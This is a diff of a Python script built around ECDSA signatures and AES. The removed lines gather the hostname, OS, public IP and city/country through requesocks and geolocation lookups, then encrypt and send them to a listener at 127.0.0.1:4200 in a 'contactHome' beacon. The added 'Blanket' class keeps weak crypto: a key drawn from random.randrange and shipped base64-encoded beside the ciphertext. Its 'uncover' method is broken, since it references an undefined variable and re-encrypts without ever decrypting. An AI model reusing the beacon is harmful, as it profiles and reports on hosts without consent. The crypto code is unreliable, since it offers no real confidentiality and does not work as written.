@@ -1,14 +1,10 @@
-import platform
-import socket
-import requesocks
 import base64
 import random
-import json
 from Crypto import Random
 from Crypto.Cipher import AES
 from ecdsa import SigningKey, VerifyingKey, BadSignatureError, NIST521p
 
-msg = ""
+msg = "Hello"
 
 BS = 16
 pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
@@ -32,69 +28,67 @@ class AESCipher:
         return unpad(cipher.decrypt( enc[16:] ))
 
 
-def generateKeys():
-    global sk, vk, vKey, cipher, sig, keyPass, decrypted, message, msg
+class Blanket:
 
-    sk = SigningKey.generate(curve=NIST521p)
-    vk = sk.get_verifying_key()
+    def cover( self, rawMsg ):
+        global sk, vk, vKey, cipher, sig, keyPass, decrypted, message, msg, secretKey
 
-    secretKey = str(random.randrange(1111111111111111,6666666666666666))
-    keyPass = base64.b64encode(secretKey)
+        sk = SigningKey.generate(curve=NIST521p)
+        vk = sk.get_verifying_key()
 
 
-    cipher = AESCipher(secretKey)
+        secretKey = str(random.randrange(1111111111111111, 6666666666666666))
+        keyPass = base64.b64encode(secretKey)
+        cipher = AESCipher(secretKey)
 
-    encrypted = cipher.encrypt(msg)
+        encrypted = cipher.encrypt(rawMsg)
 
-    vKey = cipher.encrypt(str(vk.to_pem()))
+        vKey = cipher.encrypt(str(vk.to_pem()))
 
-    decrypted = cipher.decrypt(encrypted)
+        decrypted = cipher.decrypt(encrypted)
 
-    message = encrypted
-    sig = sk.sign(message)
+        message = encrypted
+        sig = sk.sign(message)
 
-def myInfo():
-    global host, idMsg, msg
+        sep = str(random.randrange(111, 999, 3))
 
-    # Get public facing IP
-    session = requesocks.session()
-    ipJson = session.get("http://httpbin.org/ip").text
-    jsonStr = json.loads(ipJson)
-    ip = jsonStr['origin']
+        msg = (sep + keyPass + sep + vKey + sep + cipher.encrypt(sig) + sep + message)
 
-    ipJson2 = session.get("http://freegeoip.net/json/" + ip).text
-    jsonStr2 = json.loads(ipJson2)
-    city = jsonStr2['city']
-    country = jsonStr2['country_name']
+        return msg
 
-    data = {}
-    data['hostname'] = socket.gethostname()
-    data['os'] = platform.platform()
-    data['external_ip'] = ip
-    data['city'] = city
-    data['country'] = country
-    json_data = json.dumps(data)
+    def uncover( self, rawMsg ):
+        global sk, vk, vKey, cipher, sig, keyPass, decrypted, message, msg, secretKey
 
-    msg = json_data
 
-def contactHome():
+        ## Decryption Code
 
-    global msg, sep, vKey, sig, message
+        sep = data[0:3]
+        details = data.split(sep)
 
-    sep = str(random.randrange(111, 999, 3))
+        for detail in details:
+            print (base64.b64decode(detail))
 
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(("127.0.0.1", 4200))
-    print 'connected'
+        ################################################################################
 
-    msg = (sep + keyPass + sep + vKey + sep + cipher.encrypt(sig) + sep + message)
-    print msg
+        sk = SigningKey.generate(curve=NIST521p)
+        vk = sk.get_verifying_key()
 
-    s.sendall(msg)
-    s.close()
 
-    print cipher.decrypt(vKey)
+        secretKey = str(random.randrange(1111111111111111, 6666666666666666))
+        keyPass = base64.b64encode(secretKey)
+        cipher = AESCipher(secretKey)
 
-myInfo()
-generateKeys()
-contactHome()
+        encrypted = cipher.encrypt(rawMsg)
+
+        vKey = cipher.encrypt(str(vk.to_pem()))
+
+        decrypted = cipher.decrypt(encrypted)
+
+        message = encrypted
+        sig = sk.sign(message)
+
+        sep = str(random.randrange(111, 999, 3))
+
+        msg = (sep + keyPass + sep + vKey + sep + cipher.encrypt(sig) + sep + message)
+
+        return msg
